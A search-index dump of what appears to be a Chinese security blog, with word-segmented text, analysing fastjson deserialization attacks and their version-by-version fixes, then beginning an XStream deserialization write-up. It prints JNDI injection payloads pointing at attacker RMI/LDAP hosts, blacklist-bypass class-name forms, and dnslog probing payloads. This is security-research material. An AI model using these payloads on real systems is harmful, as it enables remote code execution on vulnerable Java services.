\u51fd\u6570 \u91cc \u6211\u4eec \u53ef\u4ee5 \u770b\u5230 \u8c03\u7528 \u4e86 lookup \u51fd\u6570 \uff0c \u5176 \u53c2\u6570 \u6570\u503c \u53c2\u6570\u503c \u7531   getDataSourceName   \u6765 \u83b7\u53d6 \uff0c \u8be5 \u51fd\u6570 \u4e3b\u8981 \u8fd4\u56de \u5c5e\u6027   dataSource   \uff0c \u6839\u636e fastjson \u7684 \u5229\u7528 \u539f\u7406 \uff0c \u6211\u4eec \u53ea \u9700\u8981 \u586b\u5145   dataSource   \u548c   autoCommit   \u5c31 \u53ef\u4ee5 \u89e6\u53d1 \u8fd9\u91cc \u7684 JNDI \u6ce8\u5165 \u3002   {   \" @ type \"   :   \" com . sun . rowset . JdbcRowSetImpl \"   ,   \" dataSourceName \"   :   \" rmi : / / evil : 1099 / test \"   ,   \" autoCommit \"   :   true   }   \u8fd8\u6709 \u5f88\u591a \u5176\u4ed6 \u7684 \u53ef\u4ee5 \u7528\u6765 JNDI \u6ce8\u5165 \u7684 \u5bf9\u8c61 \uff0c \u6bd4\u5982   org . hibernate . jmx . StatisticsService   \u7684   setSessionFactoryJNDIName   \u51fd\u6570 \uff0c \u539f\u7406 \u4e00\u6837 \u4e0d\u518d \u53d9\u8ff0 \u3002","title":"JdbcRowSetImpl"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#3-tomcat-dbcp-basicdatasource","text":"\u540c 1 \u4e2d \u7684 TemplateImpl \uff0c BasicDataSource \u4e5f \u53ef\u4ee5 \u8f7d\u5165 \u4efb\u610f \u7684 \u5bf9\u8c61 \u6765 \u6267\u884c \u4efb\u610f \u4ee3\u7801 \u3002 \u5148 \u6765\u8bb2 \u4e00\u4e0b \u4ed6 \u7684 \u539f\u7406   \u524d\u9762 \u7684 \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6 \u91cc \u63d0\u5230 \u4e86 \u6211\u4eec \u53ef\u4ee5 \u8c03\u7528 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 getters \uff0c \u5728   BasicDataSource   \u5b58\u5728 \u4e00\u4e2a   getConnection   \u51fd\u6570 \uff0c \u4ed6 \u4e3b\u8981 \u8c03\u7528   createConnectionFactory   \u5728   createConnectionFactory   \u51fd\u6570 \u4f7f\u7528 Class . forName \u52a0\u8f7d \u7c7b   \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 driverClassName \u548c driverClassLoader \u662f \u53ef\u63a7 \u7684 \uff0c \u8fd9\u65f6 \u65f6\u5019 \u8fd9\u65f6\u5019 \u6211\u4eec \u8981 \u7528\u5230 \u7684 \u662f   com . sun . org . apache . bcel . internal . util . ClassLoader   \uff0c \u8fd9\u4e2a ClassLoader \u53ef\u4ee5 \u4ece classname \u4e2d \u63d0\u53d6 \u51fa BCEL \u683c\u5f0f \u7684 class \u5b57\u8282 \u7801 \uff0c \u5e76 \u8c03\u7528 defineClass \u8fdb\u884c \u8f7d\u5165   \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u5199 \u4e00\u4e2a \u7528 \u4e86 \u9759\u6001 \u5757 \u7684 \u7c7b\u6765 \u6267\u884c \u4ee3\u7801 \u3002","title":"( 3 ) .   Tomcat   dbcp   BasicDataSource"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x03-fastjson","text":"\u8fd9 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u4e3b\u8981 \u8bb2\u8ff0 \u51e0\u4e2a \u91cd\u8981 \u7248\u672c \u7684 \u5b89\u5168 \u66f4\u65b0 \u5b89\u5168\u66f4\u65b0","title":"0x03   Fastjson \u5386\u53f2 \u7248\u672c \u4fee\u590d \u63aa\u65bd"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#1-fastjson-1225","text":"\u9ed8\u8ba4 \u5173\u95ed   AutoType   \uff0c \u9700\u8981 \u624b\u52a8 \u5f00\u542f   @ type   \u7684 \u652f\u6301 \uff0c \u89c1   enable _ autotype   com . alibaba . fastjson . parser . DefaultJSONParser # parseObject ( java . util . Map ,   java . lang . Object )   \u5f53 \u9047\u5230   @ type   \u65f6 \uff0c \u4f1a\u5148   com . alibaba . fastjson . parser . ParserConfig # checkAutoType   \u3002 \u8be5 \u51fd\u6570 \u7684 \u4e00\u4e2a \u4e3b\u8981 \u903b\u8f91 \uff08 1.2 . 25 \u7248\u672c \uff09   \u5f00\u542f \u4e86   AutoType   \u65f6 \uff0c \u4f1a\u8fc7 \u4e00\u6b21 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u548c \u540d\u5355 \u767d\u540d\u5355 \u68c0\u6d4b \uff08 \u5148 \u68c0\u6d4b \u540d\u5355 \u767d\u540d\u5355 \uff0c \u540e \u68c0\u6d4b \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \uff09 \u3002   \u4f18\u5148 \u8f7d\u5165 \u4eba\u5de5 \u914d\u7f6e \u7684 \u540d\u5355 \u767d\u540d\u5355 \u7c7b \uff0c \u5e76 \u5bf9 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7c7b \u7206\u51fa \u5f02\u5e38 \uff1b   \u8fd9\u91cc \u5148 \u5ffd\u7565 \u672a \u5f00\u542f   AutoType   \u65f6 \u7684 \u68c0\u6d4b \u5904\u7406   \u524d\u9762 \u7684 \u60c5\u51b5 \u90fd \u4e0d \u7b26\u5408 \uff0c \u5e76\u4e14 \u5f00\u542f \u4e86   AutoType   \uff0c \u5219 \u5c1d\u8bd5 \u53bb \u8f7d\u5165 \u4efb\u610f \u7c7b \uff0c \u4f46\u662f \u4e0d \u53ef\u4ee5 \u8f7d\u5165 ClassLoader \u548c DataSource \u7684 \u5b50\u7c7b   \u8fd9\u91cc \u8f7d\u5165 \u7684 \u65b9\u6cd5 \u7528 \u7684 \u90fd \u662f   TypeUtils . loadClass   \uff0c \u6765\u770b \u4e00\u4e0b \u4ed6 \u7684 \u4e00\u4e2a \u5904\u7406   \u9996\u5148 \u4ed6 \u5bf9\u4e8e   Lxxx . class . xxx ;   \u7684 \u7c7b \u8868\u793a \u65b9\u6cd5 \u505a   L   ,   ;   \u7684 \u5254\u9664 \uff0c \u9012\u5f52 \u8c03\u7528 loadClass \u53bb \u8c03\u7528 \u5185\u90e8 \u7684 \u5177\u4f53 \u7c7b   \u540e\u7eed \u7684 \u8c03\u7528 \u65b9\u6cd5 \u4e3a \u4f7f\u7528   AppClassLoader . loadClass   \u6216   Class . forName   \u53bb \u52a0\u8f7d \u7c7b","title":"( 1 ) .   fastjson   = =   1.2 . 25"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#autotype","text":"\u6839\u636e \u4e0a\u9762 \u7684 \u5206\u6790 \uff0c \u5982\u679c \u5f00\u542f \u4e86   AutoType   \uff0c \u90a3\u4e48 \u5982\u679c \u662f \u5728 \u540d\u5355 \u767d\u540d\u5355 \u91cc \u7684 \u7c7b \uff0c \u76f4\u63a5 \u52a0\u8f7d \uff0c \u5bf9\u4e8e \u5728 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5185 \u7684 \u7c7b \u76f4\u63a5 \u629b\u51fa \u5f02\u5e38 \u3002   \u800c \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u68c0\u6d4b \u65b9\u5f0f \u662f \u53bb \u5339\u914d \u5f53\u524d \u7684 \u7c7b\u540d   class . startsWith ( deny )   \u800c \u5728 \u8fd9\u4e2a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u91cc \u663e\u7136 \u5e76 \u6ca1\u6709 \u8003\u8651 \u5230   TypeUtils . loadClass   \u5b9e\u73b0 \u4e2d \uff0c \u5bf9\u4e8e   Lxxxx . class . xxx ;   \u7684 \u5904\u7406 \u3002   \u901a\u8fc7   Lxxxxx ;   \u7684 \u65b9\u5f0f   startsWith   \u6ca1 \u529e\u6cd5 \u6b63\u5e38 \u5339\u914d \u51fa\u6765 \uff0c \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u7ed5\u8fc7 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7684 \u68c0\u6d4b \u3002","title":"\u5f00\u542f AutoType \u7684 \u60c5\u51b5 \u4e0b \u7ed5\u8fc7 \u9ed1\u540d\u5355 \u68c0\u6d4b"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#2-fastjson-1242","text":"\u5728 \u8fd9\u4e2a \u7248\u672c \uff0c \u5bf9 \u4e0a\u9762 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u68c0\u6d4b \u7ed5\u8fc7 \u505a \u4e86 \u4fee\u590d \uff0c \u5e76\u4e14 \u5c06 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u91cc \u7684 \u7c7b\u578b \u8fdb\u884c hash \u5904\u7406 \uff0c \u589e\u52a0 \u4e86 \u5206\u6790 \u96be\u5ea6 \uff1b   \u5bf9\u4e8e \u524d\u9762   Lxxxxx ;   \u7684 \u7ed5\u8fc7 \uff0c 42 \u7248\u672c \u6dfb\u52a0 \u4e86 \u4ee5\u4e0b \u4ee3\u7801 \u6765 \u5254\u9664 \uff08 \u56e0\u4e3a \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u5df2\u7ecf \u53d8\u6210 \u4e86 hash \u6bd4\u8f83 \u7684 \u65b9\u5f0f \uff0c \u8fd9\u91cc   L ;   \u90fd \u4ee5 \u8fd9\u79cd \u65b9\u5f0f \u6765 \u786e\u8ba4 \uff09   \u4f46\u662f \u8fd9\u91cc \u7684 \u5904\u7406 \u6cbb\u6807 \u4e0d\u6cbb \u6cbb\u672c \u6cbb\u6807\u4e0d\u6cbb\u672c \uff0c \u6211\u4eec \u4f7f\u7528   LLxxxxx ; ;   \u8fd9\u79cd \u65b9\u5f0f \u5c31 \u53ef\u4ee5 \u7ed5\u8fc7 \u3002   \u9664\u6b64 \u4e4b\u5916 \u9664\u6b64\u4e4b\u5916 \uff0c \u7531\u4e8e \u73b0\u5728 \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u53d8\u6210 \u4e86 hash \u8ba1\u7b97 \u7684 \u65b9\u5f0f \uff0c \u7ed9 \u6211\u4eec \u5206\u6790 \u589e\u52a0 \u4e86 \u4e0d\u5c11 \u96be\u5ea6 \uff0c \u4e0d\u8fc7 \u6709 \u5927\u4f6c \u5bf9 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 hash \u505a \u4e86 \u8fd8\u539f \u89c1   fastjson - blacklist","title":"( 2 ) .   fastjson   = =   1.2 . 42"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#3-fastjson-1243","text":"\u8fd9\u4e2a \u7248\u672c \u4e3b\u8981 \u4fee\u590d \u4e86 \u4e0a\u9762   LLxxxx ; ;   \u7684 \u65b9\u5f0f   \u505a \u4e86 \u4e24\u6b21 \u68c0\u6d4b \uff0c \u5982\u679c \u78b0\u4e0a   LLxxxxx ; ;   \u7684 \u65b9\u5f0f \u5219 \u76f4\u63a5 \u7206\u51fa \u5f02\u5e38","title":"( 3 ) .   fastjson   = =   1.2 . 43"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#4-fastjson-1248","text":"","title":"( 4 ) .   fastjson   = =   1.2 . 48"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#_1","text":"\u5728 48 \u7248\u672c \u4e4b\u524d \uff0c   checkAutoType   \u8fd8 \u5b58\u5728 \u8fd9\u6837 \u4e00\u4e2a \u903b\u8f91 \uff08 \u4ee5 1.2 . 47 \u4e3a\u4f8b \uff09   \u5f53 \u5f00\u542f   AutoType   \u65f6 \uff0c \u5982\u679c mappings \u91cc\u9762 \u5b58\u5728 \u8fd9\u4e2a \u7c7b \uff0c \u90a3\u4e48 \u5c31\u7b97 \u8fd9\u4e2a \u7c7b \u5728 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u91cc \uff0c \u4e5f \u5141\u8bb8 \u4ed6 \u8fdb\u884c \u4e0b \u4e00\u6b65 \u64cd\u4f5c   PS \uff1a \u8fd9\u91cc \u7684 mappings \u662f fastjson \u63d0\u65e9 \u8f7d\u5165 \u7684 \u4e00\u4e9b \u7f13\u5b58 \u7c7b   \u540e\u7eed \u5982\u679c \u80fd \u4ece mappings \u91cc\u9762 \u5f97\u5230 \u8fd9\u4e2a \u7c7b \uff0c \u5c31 \u76f4\u63a5 \u8fd4\u56de \u3002 \u90a3\u4e48 \u6211\u4eec \u6ca1\u6709 \u6709\u6ca1\u6709 \u4ec0\u4e48 \u65b9\u6cd5 \u5c06 \u6211\u4eec \u9700\u8981 \u7684 \u7c7b \u52a0\u5165 \u5230 \u8fd9\u4e2a mappings \u91cc \u5462 \uff1f   \u5148 \u6765\u770b \u4e00\u4e0b   deserializers . findClass   \uff0c \u5728   deserializers   \u91cc\u9762 \u9884\u5148 \u586b\u5145 \u4e86 \u4e00\u4e9b \u7c7b \u4e0e\u5176 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5668 \u7684 \u5b9e\u4f8b   \u8fd9\u91cc \u6211\u4eec \u4e3b\u8981 \u5173\u6ce8 \u4e00\u4e0b   Class . class   \uff0c \u4ed6 \u6240 \u5bf9\u5e94 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5668\u4e3a   MiscCodec   \uff0c   checkAutoType   \u68c0\u6d4b \u8fc7\u540e \uff0c \u540e\u7eed \u5c06 \u8c03\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5668 \u7684   deserialze   \u51fd\u6570 \u3002 \u6765 \u770b\u770b MiscCodec \u7684 \u8fd9\u4e2a \u51fd\u6570 \u5bf9\u4e8e   Class . class   \u7684 \u5904\u7406   \u4ed6 \u8c03\u7528 \u4e86   TypeUtils . loadClass   \u51fd\u6570 \uff0c \u524d\u9762 \u6211\u4eec \u8bb2\u8fc7 \uff0c \u4ed6 \u5c06 \u4f7f\u7528   ClassLoader . loadClass   \u6216   Class . forName   \u6765 \u8f7d\u5165 \u7c7b \uff0c \u5728 \u8fd9 \u4e00 \u8fc7\u7a0b \u4e2d \uff0c \u6d89\u53ca \u5230 \u4e86   mappings   \u7684 \u64cd\u4f5c   \u8fd9\u91cc \u7684   cache   \u9ed8\u8ba4 \u4e3a   true   \uff0c \u6240\u4ee5 \u8fd9\u91cc \u4f1a \u76f4\u63a5 \u5c06 \u8f7d\u5165 \u540e \u7684 \u5bf9\u8c61 \u586b\u5165   mappings   \u6839\u636e \u6211\u4eec \u524d\u9762 \u7684 \u5206\u6790 \uff0c \u5982\u679c \u5f53\u524d   mappings   \u91cc \u5b58\u5728 \u53ef\u63a7 \u7684 \u7c7b \uff0c \u90a3\u4e48 \u4e0d\u7ba1 \u5f00 \u6ca1 \u5f00\u542f   AutoType   \uff0c \u90fd \u4f1a \u8fdb\u884c \u7c7b \u8fd8\u539f \uff1b \u540c\u65f6 \u6211\u4eec \u5229\u7528   Class . class   \u53ef\u4ee5 \u5411   mappings   \u586b\u5145 \u4efb\u610f \u7c7b \uff0c \u8fd9 \u5bfc\u81f4 \u7ed5\u8fc7 \u4e86 \u524d\u9762 \u7684 \u68c0\u6d4b \uff1b   / /   \u4e3e\u4e2a \u4f8b\u5b50   json   =   \" { \"   +   / /   \u7528 Class \u8f7d\u5165 com . sun . rowset . JdbcRowSetImpl \uff0c \u5e76 \u7f13\u5b58 \u5230 mappings   \" { \\ \" @ type \\ \" : \\ \" java . lang . Class \\ \" , \\ \" val \\ \" : \\ \" com . sun . rowset . JdbcRowSetImpl \\ \" } , \"   +   / /   \u540e\u7eed \u4f7f\u7528 mappings \u91cc \u7684 com . sun . rowset . JdbcRowSetImpl \u6765 \u8fd8\u539f \u5bf9\u8c61   \" { \\ \" @ type \\ \" :   \\ \" com . sun . rowset . JdbcRowSetImpl \\ \" , \"   +   \" \\ \" dataSourceName \\ \" :   \\ \" ldap : / / localhost : 1389 / Exploit \\ \" , \"   +   \" \\ \" autoCommit \\ \" :   true } \"   +   \" } \"   ;","title":"\u4fee\u590d \u524d \u7684 \u7248\u672c"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#_2","text":"\u5728 1.2 . 48 \u7248\u672c \u4e0a \u5bf9 \u5176 \u8fdb\u884c \u4e86 \u4fee\u590d   \u5728   MiscCodec   \u5bf9 Class \u7684 \u5904\u7406 \u4e2d \uff0c \u4fee\u6539 \u4e86   cache = false   \u5e76\u4e14 \u5bf9\u4e8e   TypeUtils . loadClass   \u91cc \u7684   mappings   \u64cd\u4f5c \u90fd \u4f9d\u8d56 \u8d56\u4e8e \u4f9d\u8d56\u4e8e   cache   \uff0c \u5982\u679c \u4e3a   false   \u5219 \u4e0d \u6dfb\u52a0 \u5230   mappings   \u91cc \uff08 \u5728 \u524d\u9762 \u7684 \u7248\u672c \u91cc   Class . forName   \u90e8\u5206 \u5e76 \u4e0d \u4f9d\u8d56 cache \uff0c 48 \u7248\u672c \u4e4b\u540e \u589e\u52a0 \u4e86 \u5bf9 cache \u7684 \u5224\u65ad \uff09   \u4e0e\u6b64 \u540c\u65f6 \u4e0e\u6b64\u540c\u65f6 \uff0c   java . lang . Class   \u4e5f \u88ab \u52a0\u5165 \u5230 \u4e86 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u91cc\u9762","title":"\u4fee\u590d \u540e \u7684 \u7248\u672c"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#5","text":"\u540e\u7eed \u7248\u672c \u7684 \u7ed5\u8fc7 \u4e3b\u8981 \u56f4\u7ed5 \u5728 \uff1a   \u5f00\u542f   AutoType   \uff0c \u7ed5\u8fc7 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u68c0\u6d4b   \u5229\u7528   deserializers   \u91cc\u9762 \u7684 \u7c7b ( \u8ddf   Class . class   \u4e00\u4e2a \u539f\u7406 )   \u6700\u65b0 \u65b0\u7248 \u6700\u65b0\u7248 1.2 . 68 \u5f15\u5165 \u4e86   safeMode   \uff0c \u5728   checkAutoType   \u91cc \u6dfb\u52a0 \u4e86 \u4e0b\u9762 \u5224\u65ad \uff0c \u5982\u679c \u5f00\u542f \u4e86 safemode \uff0c \u90a3\u4e48 \u5c06 \u4e0d \u5141\u8bb8 \u8fdb\u884c   @ type   \u4e0d\u8fc7 \u8fd9\u4e2a \u5e76 \u4e0d\u662f \u9ed8\u8ba4 \u5f00\u542f \u7684 \uff0c \u9700\u8981 \u4eba\u5de5 \u53bb \u914d\u7f6e \u3002","title":"( 5 ) .   \u540e\u7eed \u7248\u672c"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#6","text":"fastjson   <   1.2 . 60   dos   Fastjson - 1 - 2 - 60 - Dos   \u4f7f\u7528 dnslog \u6765 \u68c0\u6d4b fastjson \u6f0f\u6d1e   https : / / github . com / alibaba / fastjson / issues / 3077   \u8fd9\u91cc \u7684 \u539f\u7406 \u8ddf   Class . class   \u662f \u4e00\u6837 \u7684 \uff0c \u53ea\u662f \u6362\u6210 \u4e86   java . net . URL   \u3001   java . net . Inet4Address   \u3001   java . net . Inet6Address   \uff0c \u7531 MiscCodec \u5904\u7406 \u65f6\u4f1a \u53bb \u89e6\u53d1 dns \u67e5\u8be2   \u5f53\u7136 \u8fd9\u91cc \u7684 \u89e6\u53d1 URL \u7684 \u89e6\u53d1 \u7528 \u7684 ysoserial \u91cc\u9762 \u7684 URLDNS \u7684 \u65b9\u5f0f \uff0c \u7531 hashcode \u53bb \u89e6\u53d1 \uff1b   { \" @ type \" : \" java . net . Inet4Address \" , \" val \" : \" dnslog \" }   { \" @ type \" : \" java . net . Inet6Address \" , \" val \" : \" dnslog \" }   { { \" @ type \" : \" java . net . URL \" , \" val \" : \" http : / / s81twxdise25yxjinqaar74iq9wzko . burpcollaborator . net \" } : \" aaa \" }","title":"( 6 ) .   \u540e\u7eed \u7248\u672c \u89c9\u5f97 \u6709\u610f\u601d \u7684 \u5229\u7528"},{"location":"blog/2020/talk-about-fastjson-deserialization-20200413/#0x04","text":"\u5230 \u8fd9\u91cc fastjson \u76f8\u5173 \u7684 \u77e5\u8bc6 \u77e5\u8bc6\u70b9 \u5c31 \u68b3\u7406 \u7ed3\u675f \u4e86 \uff0c \u8fd9 \u5176\u4e2d \u5f00\u53d1 \u5f00\u53d1\u8005 \u4e0e \u5b89\u5168 \u7814\u7a76 \u4eba\u5458 \u7684 \u653b\u9632 \u4ea4\u4e92 \u771f\u662f \u4ee4\u4eba \u79f0 \u5feb \uff01 \u540e\u7eed \u5982\u679c \u6709 \u5176\u4ed6 \u7684 \u7ed5\u8fc7 \uff0c \u8fd8\u4f1a \u7ee7\u7eed \u5199\u4e0b \u4e0b\u53bb \u5199\u4e0b\u53bb \u3002   \u603b\u7ed3 \u4e00\u4e0b fastjson \u5229\u7528 \u4e2d \u7684 \u7279\u8272 \uff1a   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u65f6 \u4e3b\u52a8 \u89e6\u53d1 \u7b26\u5408 \u6761\u4ef6 \u7b26\u5408\u6761\u4ef6 \u7684 setters \u548c getters \uff0c \u5176\u4e2d \u4f7f\u7528 parse \u548c parseObject \u51fd\u6570 \uff0c \u5728 getter \u5229\u7528 \u4e0a parseObject \u7684 \u9650\u5236 \u66f4 \u4f4e \u4e00\u70b9 \uff1b \u4f46\u662f \u8fd9\u91cc \u6211\u4eec \u53ef\u4ee5 \u5229\u7528 \u672c\u6587 \u7684 \u4e24\u79cd \u65b9\u6cd5 \u5c06 parse \u7684 \u8c03\u7528 \u6548\u679c \u8f6c\u5316 \u4e3a parseObject   com . sun . org . apache . bcel . internal . util . ClassLoader   \u662f \u4e2a \u597d \u4e1c\u897f   fastjson \u7684 \u9ed1\u540d \u540d\u5355 \u9ed1\u540d\u5355 \u7ed5\u8fc7 \u6765\u770b \uff0c \u57fa\u672c \u57fa\u672c\u4e0a \u627e \u7684 \u90fd \u662f jndi \u76f8\u5173 \u7684 \u5229\u7528 \uff0c \u6216\u8bb8 \u53ef\u4ee5 \u6269\u5c55 \u4e00\u4e9b \u5176\u4ed6 \u7684 \uff1f   \u6709\u65f6 \u65f6\u5019 \u6709\u65f6\u5019 \u5f00\u53d1 \u5f00\u53d1\u8005 \u7406\u89e3 \u4e0d \u5230\u4f4d \uff0c \u6253 \u5f97 \u8865\u4e01 \u53ef\u4ee5 \u8f7b\u677e \u88ab \u7ed5\u8fc7 \uff0c \u6240\u4ee5 \u9700\u8981 \u7d27\u76ef \u8865\u4e01 \u7684 \u60c5\u51b5","title":"0x04   \u603b\u7ed3"},{"location":"blog/2020/talk-about-xstream-deserialization-20200418/","tags":["java"],"text":"0x00   \u524d\u8a00   XStream   \u4e5f \u662f \u4e00\u6b3e \u7528 \u7684 \u6bd4\u8f83 \u591a \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u7ec4\u4ef6 \uff0c \u53ef\u4ee5 \u5c06 object \u8f6c\u5316 \u4e3a XML \u5e76 \u80fd \u5b8c\u6574 \u7684 \u8fd8\u539f \u56de\u6765 \u3002 \u4ed6 \u4e5f \u66fe\u7ecf \u51fa\u73b0 \u8fc7\u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c \u672c\u6587 \u4e3b\u8981 \u6574\u7406 XStream \u76f8\u5173 \u7684 \u5b89\u5168 \u95ee\u9898 XD   0x01   \u57fa\u7840 \u77e5\u8bc6 \u57fa\u7840\u77e5\u8bc6   XStream \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e3b\u8981 \u4f9d\u9760   toXML   \u51fd\u6570 \u548c   fromXML   \u51fd\u6570 \uff0c \u5982\u4e0b \u4ee3\u7801 \u6240\u793a   Person   person   =   new   Person   (   \" tom \"   ,   18   ) ;   XStream   xStream   =   new   XStream   ( ) ;   String   xml   =   xStream   .   toXML   (   person   ) ;   / /   object   to   xml   System   .   out   .   println   (   xml   ) ;   System   .   out   .   println   (   xStream   .   fromXML   (   xml   ) ) ;   / /   xml   to   object   / /   \u8f93\u51fa   / /   < objects . Person >   / /   < name > tom < / name >   / /   < age > 18 < / age >   / /   < / objects . Person >   / /   objects . Person @ 369f73a2   \u5173\u4e8e XStream \u7684 fromXML \u5206\u6790 \u770b   \u8fd9 \u6587\u7ae0 \u7bc7\u6587\u7ae0   \uff0c XStream \u4f1a \u53bb \u8c03\u7528 \u4e0d\u540c \u7684 Converters \u6765 \u5904\u7406 \u8fd8\u539f \u7684 \u8fc7\u7a0b \u3002   XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u540c fastjson \u8fd9\u79cd \u4e0d \u4e00\u6837 \u7684 \u5730\u65b9 \u662f fastjson \u4f1a \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u65f6\u5019 \u4e3b\u52a8 \u53bb \u8c03\u7528 getters \u548c setters \uff0c \u800c XStream \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u4e2d \u8d4b\u503c \u90fd \u6709 Java \u7684 \u53cd\u5c04 \u673a\u5236 \u6765 \u5b8c\u6210 \uff0c \u6240\u4ee5 \u5e76 \u6ca1\u6709 \u8fd9\u6837 \u4e3b\u52a8 \u8c03\u7528 \u7684 \u7279\u6027 \u3002   \u4f46\u662f \u8fd8\u6709 \u4e00\u79cd \u5229\u7528 \u65b9\u5f0f \uff0c \u56de\u60f3 \u4e00\u4e0b \uff0c \u5728 \u51e0\u6761 \u5e38\u89c4 \u7684 java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u4e0a \uff0c \u90fd \u5229\u7528 \u4e86   HashMap   \u3001   PriorityQueue   \u7b49 \u5bf9\u8c61 \uff08 key \u4e0d\u53ef \u91cd\u590d \u7b49 \u7279\u6027 \uff09 \u4f1a \u81ea\u52a8 \u53bb \u8c03\u7528   hashCode   \u3001   equal   \u3001   compareTo   \u7b49 \u8fd9\u79cd \u51fd\u6570 \u3002   \u4ee5 \u8fd9\u79cd \u60f3\u6cd5 \u6765\u770b XStream \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5f53 \u6211\u4eec \u5bf9 Map \u8fd9\u79cd \u7c7b\u578b \u7684 \u5bf9\u8c61 \u8fdb\u884c \u8fd8\u539f \u7684 \u65f6\u5019 \uff0c \u662f\u5426 \u4e5f \u540c\u6837 \u4f1a \u53bb \u8c03\u7528 \u4e0a\u9762 \u63d0\u5230 \u7684 \u51e0\u79cd \u51fd\u6570 \uff1f \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u770b \u51e0\u4e2a Converter \u7684 \u5904\u7406 \uff1a   1 .   MapConverter   \u6765 \u770b\u770b \u9488\u5bf9 Map \u7c7b\u578b \u8fd8\u539f \u7684 Converter   com . thoughtworks . xstream . converters . collections . MapConverter # unmarshal   populateMap   \u51fd\u6570 \u4f1a \u53bb \u5904\u7406 \u540e\u7eed \u7684 \u503c \uff0c \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u6765\u770b \u5177\u4f53 put \u7684 \u5730\u65b9   com . thoughtworks . xstream . converters . collections . MapConverter # putCurrentEntryIntoMap   \u8fd9\u91cc target \u4f5c\u4e3a \u63a5\u6536 \u63a5\u6536\u8005 \uff0c \u4f1a \u8c03\u7528 Map \u7684 put \u51fd\u6570 \uff0c \u540e\u7eed \u5c31\u662f \u6211\u4eec \u719f\u6089 \u7684 \u5bf9 key \u8c03\u7528 hashCode \u51fd\u6570   2 .   TreeSet / TreeMapConverter   \u8fd9\u91cc TreeSet \u548c TreeMap \u4e00\u8d77 \u8bb2 \uff0c \u56e0\u4e3a TreeSet \u672c\u8eab \u5c31\u662f \u4e00\u4e2a \u53ea\u7528 \u4e0a \u4e86 Key \u7684 TreeMap \uff1b TreeSetConverter \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5904\u7406 \u4e5f \u662f \u5148 \u8f6c\u5316 \u4e3a TreeMapConverter \u7684 \u65b9\u5f0f \u6765 \u4f18\u5148 \u8fd8\u539f TreeSet \u91cc \u7684 TreeMap \uff0c \u518d \u586b\u5145 \u5230 TreeSet \u91cc \u3002   \u4ece TreeSetConverter \u6765\u8bb2   \u4ece treeset \u4e2d \u53d6\u51fa field   treemap \u540e \uff0c \u53bb \u4e00\u6b65 \u8fdb\u4e00\u6b65 \u8c03\u7528 TreeMapConverter \u6765 \u8fd8\u539f TreeMap   com . thoughtworks . xstream . converters . collections . TreeMapConverter # populateTreeMap   \u8fd9\u91cc \u5148\u7528 soredMap \u6765 \u586b\u5145 \u9700\u8981 \u8fd8\u539f \u7684 Entry \uff0c \u540e\u7eed \u5c06 \u8c03\u7528   TreeMap . putAll   \u6700\u7ec8 \u4f1a \u8c03\u7528 \u5230   java . util . AbstractMap # putAll   \u8fd9\u91cc \u7684 put \u51fd\u6570 \u4e3a   TreeMap . put   , \u4e0d\u770b \u5177\u4f53 \u7684 \u4ee3\u7801 \u4e86 \uff0c \u4ed6 \u7684 \u4e3b\u8981 \u529f\u80fd \u5c31\u662f \u586b\u5145 \u6570\u636e \uff0c \u5e76\u4e14 \u5728 \u586b\u5145 \u65f6 \u5c06 \u4f1a \u6bd4\u8f83 \u5f53\u524d \u5b58\u5728 key \uff0c \u5982\u679c \u662f \u76f8\u540c \u7684 key \uff0c \u5219 \u66ff\u6362 